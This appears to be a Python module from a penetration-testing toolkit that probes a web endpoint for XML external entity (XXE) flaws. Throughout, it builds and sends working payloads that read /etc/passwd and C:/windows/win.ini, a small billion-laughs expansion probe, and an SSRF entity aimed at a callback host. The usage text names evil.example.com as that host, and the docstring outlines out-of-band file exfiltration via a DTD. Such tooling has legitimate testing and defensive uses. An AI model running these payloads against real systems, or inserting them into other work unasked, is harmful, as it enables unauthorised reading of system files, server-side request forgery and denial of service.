#!/usr/bin/env python3
"""
redshift_toolkit.web.xxe_oracle — XML external entity detection.

Detection modes
---------------
1. In-band file read: insert SYSTEM entity referencing /etc/passwd or
   c:/windows/win.ini and look for known content fragments in the response.
2. Error-based: SYSTEM entity to nonexistent path; rely on parser leaking
   filesystem error in response.
3. SSRF via XXE: SYSTEM entity to http://attacker-callback/UUID and watch
   for the callback (callback host is the operator's responsibility).
4. Out-of-band exfil via DTD: deliver a parameter entity DTD that defines
   another entity that loads a URL containing the file content.

This module focuses on detection. For rich extraction the right tool is
xxeinjector or a custom Python script driven by Burp Collaborator.

Usage
-----
  python3 -m redshift_toolkit.web.xxe_oracle --url https://app.example.com/api/import
  python3 -m redshift_toolkit.web.xxe_oracle --url https://app.example.com/api/import \\
      --callback http://evil.example.com/callback/UUID
  python3 -m redshift_toolkit.web.xxe_oracle --url https://app.example.com/api/import \\
      --content-type application/xml

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import secrets
import sys
from dataclasses import dataclass, asdict, field

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# Markers in /etc/passwd we look for in responses.
PASSWD_MARKERS = ["root:x:", "daemon:", "/bin/bash", "/sbin/nologin"]
# Markers in C:/Windows/win.ini
WIN_INI_MARKERS = ["[fonts]", "[extensions]", "[mci extensions]"]


@dataclass
class XxeAttempt:
    label: str
    payload: str
    response_status: int = 0
    response_excerpt: str = ""
    indicator_hit: str | None = None


@dataclass
class XxeReport:
    url: str
    findings: list[XxeAttempt] = field(default_factory=list)


def linux_file_read(url: str, path: str = "/etc/passwd",
                    *, content_type: str = "application/xml",
                    extra_headers: list[tuple[str, str]] | None = None,
                    tls_verify: bool = True, timeout: float = 15.0) -> XxeAttempt:
    payload = (
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "file://{path}">\n'
        f']>\n'
        f'<root><data>&xxe;</data></root>\n'
    )
    headers = [("Content-Type", content_type)] + (extra_headers or [])
    r = send(HttpRequest(method="POST", url=url, headers=headers, body=payload),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    body = r.body.decode("latin-1", errors="replace")
    hit = None
    for marker in PASSWD_MARKERS:
        if marker in body:
            hit = marker
            break
    return XxeAttempt(label="linux file read", payload=payload,
                      response_status=r.status, indicator_hit=hit,
                      response_excerpt=body[:300])


def windows_file_read(url: str, path: str = "C:/windows/win.ini",
                      *, content_type: str = "application/xml",
                      extra_headers: list[tuple[str, str]] | None = None,
                      tls_verify: bool = True, timeout: float = 15.0) -> XxeAttempt:
    payload = (
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "file:///{path}">\n'
        f']>\n'
        f'<root><data>&xxe;</data></root>\n'
    )
    headers = [("Content-Type", content_type)] + (extra_headers or [])
    r = send(HttpRequest(method="POST", url=url, headers=headers, body=payload),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    body = r.body.decode("latin-1", errors="replace")
    hit = None
    for marker in WIN_INI_MARKERS:
        if marker in body:
            hit = marker
            break
    return XxeAttempt(label="windows file read", payload=payload,
                      response_status=r.status, indicator_hit=hit,
                      response_excerpt=body[:300])


def ssrf_via_xxe(url: str, callback: str,
                 *, content_type: str = "application/xml",
                 extra_headers: list[tuple[str, str]] | None = None,
                 tls_verify: bool = True, timeout: float = 15.0) -> XxeAttempt:
    """Fire an HTTP entity load via XXE. Operator should monitor `callback`."""
    payload = (
        f'<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "{callback}">\n'
        f']>\n'
        f'<root><data>&xxe;</data></root>\n'
    )
    headers = [("Content-Type", content_type)] + (extra_headers or [])
    r = send(HttpRequest(method="POST", url=url, headers=headers, body=payload),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    return XxeAttempt(label="SSRF via XXE", payload=payload,
                      response_status=r.status,
                      response_excerpt=r.body.decode("latin-1", errors="replace")[:300])


def billion_laughs_dos_indicator(url: str, *,
                                  content_type: str = "application/xml",
                                  extra_headers: list[tuple[str, str]] | None = None,
                                  tls_verify: bool = True,
                                  timeout: float = 15.0) -> XxeAttempt:
    """Send small billion-laughs payload to test for entity expansion limits.

    NOTE: lab use only. Heavy DoS variants are not produced here.
    """
    payload = (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE lolz [\n'
        '  <!ENTITY lol "lol">\n'
        '  <!ENTITY lol2 "&lol;&lol;">\n'
        '  <!ENTITY lol3 "&lol2;&lol2;">\n'
        ']>\n'
        '<root>&lol3;</root>\n'
    )
    headers = [("Content-Type", content_type)] + (extra_headers or [])
    r = send(HttpRequest(method="POST", url=url, headers=headers, body=payload),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    body = r.body.decode("latin-1", errors="replace")
    hit = "lollollollollollollol" if "lollollollollollollol" in body else None
    return XxeAttempt(label="billion laughs (small)", payload=payload,
                      response_status=r.status, indicator_hit=hit,
                      response_excerpt=body[:300])


def render_text(rep: XxeReport, color: bool) -> str:
    out = [paint(f"\n=== XXE oracle: {rep.url} ===", BOLD, color)]
    for a in rep.findings:
        if a.indicator_hit:
            tag = paint("[VULN]", RED, color)
        else:
            tag = paint("[----]", GREEN, color)
        out.append(f"  {tag} {a.label}  status={a.response_status}")
        if a.indicator_hit:
            out.append(f"      ✓ marker: {a.indicator_hit!r}")
            out.append(f"      response excerpt: {a.response_excerpt[:200].strip()}")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="XXE detection oracle.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--content-type", default="application/xml")
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--callback", help="URL to fire from XXE entity (you must monitor it)")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    extra = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra.append((k.strip(), v.strip()))

    rep = XxeReport(url=args.url)
    rep.findings.append(linux_file_read(args.url, content_type=args.content_type,
                                        extra_headers=extra,
                                        tls_verify=not args.insecure,
                                        timeout=args.timeout))
    rep.findings.append(windows_file_read(args.url, content_type=args.content_type,
                                          extra_headers=extra,
                                          tls_verify=not args.insecure,
                                          timeout=args.timeout))
    rep.findings.append(billion_laughs_dos_indicator(args.url,
                                                      content_type=args.content_type,
                                                      extra_headers=extra,
                                                      tls_verify=not args.insecure,
                                                      timeout=args.timeout))
    if args.callback:
        rep.findings.append(ssrf_via_xxe(args.url, args.callback,
                                         content_type=args.content_type,
                                         extra_headers=extra,
                                         tls_verify=not args.insecure,
                                         timeout=args.timeout))

    if args.json:
        print(json.dumps({
            "url": rep.url,
            "findings": [asdict(f) for f in rep.findings],
        }, indent=2))
    else:
        print(render_text(rep, color))

    has_vuln = any(a.indicator_hit for a in rep.findings)
    return 0 if not has_vuln else 1


if __name__ == "__main__":
    sys.exit(main())
